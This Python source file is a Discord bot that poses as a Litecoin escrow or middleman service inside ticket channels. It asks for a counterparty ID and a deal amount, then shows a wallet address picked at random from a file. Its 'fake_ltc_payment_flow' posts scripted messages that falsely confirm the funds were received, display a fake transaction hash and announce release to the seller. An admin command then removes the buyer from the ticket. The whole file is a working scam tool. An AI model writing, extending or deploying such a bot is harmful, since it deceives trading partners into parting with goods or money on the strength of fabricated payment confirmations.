import discord
from discord.ext import commands
from discord.utils import get
import random
import string
import json
import asyncio

# Load config
with open("config.json") as f:
    config = json.load(f)

TOKEN = config["token"]
CATEGORY_ID = config["category_id"]
ADMIN_IDS = config["admin_ids"]
PREFIX = config["prefix"]

intents = discord.Intents.all()
bot = commands.Bot(command_prefix=PREFIX, intents=intents)

active_tickets = {}

def get_random_ltc_address():
    with open("ltcaddy.txt", "r") as f:
        addresses = [line.strip() for line in f if line.strip()]
    return random.choice(addresses)

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}.")

@bot.event
async def on_guild_channel_create(channel):
    if isinstance(channel, discord.TextChannel) and channel.category_id == CATEGORY_ID:
        await asyncio.sleep(1)
        fake_id = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
        await channel.send(f"Please provide the **Developer ID** to add to the ticket. Ticket ID: `{fake_id}`")
        active_tickets[channel.id] = {"buyer_id": None, "developer_added": False, "deal_amount": None}

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return

    channel = message.channel
    if isinstance(channel, discord.TextChannel) and channel.category_id == CATEGORY_ID:

        data = active_tickets.get(channel.id)

        # Step 1: Add developer
        if data and not data["developer_added"] and message.content.isdigit():
            try:
                dev = await bot.fetch_user(int(message.content))
                await channel.set_permissions(dev, read_messages=True, send_messages=True)
                await channel.send(f"{dev.mention} has been added to the ticket.")
                data["developer_added"] = True
                data["buyer_id"] = message.author.id
                await send_instruction_embeds(channel)
                return
            except:
                await channel.send("Invalid Developer ID.")

        # Step 2: Accept deal amount (only from buyer)
        if data and data["developer_added"] and data["deal_amount"] is None:
            if message.author.id == data["buyer_id"]:
                try:
                    amount = float(message.content.strip())
                    data["deal_amount"] = amount
                    await channel.send(f"✅ Deal amount of **${amount}** has been noted.")
                    await fake_ltc_payment_flow(channel, amount)
                except:
                    await channel.send("❌ Invalid amount. Please enter a valid number (e.g., 5.5).")

    await bot.process_commands(message)

async def send_instruction_embeds(channel):
    embeds = []

    embed1 = discord.Embed(
        title="👤 Provide Developer ID",
        description="Give the correct user ID with whom you are dealing. Don’t give the username.",
        color=0x3498db
    )
    embed1.add_field(name="Example:", value="`123456789012345678`", inline=False)
    embeds.append(embed1)

    embed2 = discord.Embed(
        title="📝 ToS and Warranty",
        description="Please deal inside ticket, confirm your deal and warranty here. Don't delete messages.",
        color=0xe67e22
    )
    embeds.append(embed2)

    embed3 = discord.Embed(
        title="✅ Role Selection",
        description="Please confirm who's sending and who's receiving funds:",
        color=0x2ecc71
    )
    embed3.add_field(name="Click buttons below:", value="Buyer | Seller", inline=False)
    embeds.append(embed3)

    embed4 = discord.Embed(
        title="💵 Enter Deal Amount",
        description="Please enter the deal amount in $ (e.g., `5.00`). Don’t include symbols.",
        color=0xf1c40f
    )
    embeds.append(embed4)

    for embed in embeds:
        await channel.send(embed=embed)

async def fake_ltc_payment_flow(channel, amount):
    ltc_address = get_random_ltc_address()
    await asyncio.sleep(1)
    await channel.send(
        f"Please send **${amount}** worth of **LTC** to the following address:\n```{ltc_address}```"
    )
    await asyncio.sleep(2)
    await channel.send("⏳ Waiting for fake confirmation...")

    await asyncio.sleep(4)
    await channel.send("✅ **Funds received successfully**. Both parties may proceed with the deal.")

    await asyncio.sleep(2)
    await channel.send("🧾 *[FAKE]* LTC Transaction Hash: `b6f699d22a1234ffedbc9ab0ed1e...`")
    await asyncio.sleep(2)
    await channel.send("🎉 Buyer clicked release. Funds released to seller.")

@bot.command()
async def end(ctx):
    if ctx.author.id not in ADMIN_IDS:
        return await ctx.send("❌ You don't have permission to use this command.")

    data = active_tickets.get(ctx.channel.id)
    if data and data["buyer_id"]:
        member = ctx.guild.get_member(data["buyer_id"])
        if member:
            await ctx.channel.set_permissions(member, overwrite=None)
            await ctx.send(f"🛑 Buyer {member.mention} has been removed from the ticket.")
    else:
        await ctx.send("❌ No buyer found in this ticket.")

bot.run(TOKEN)
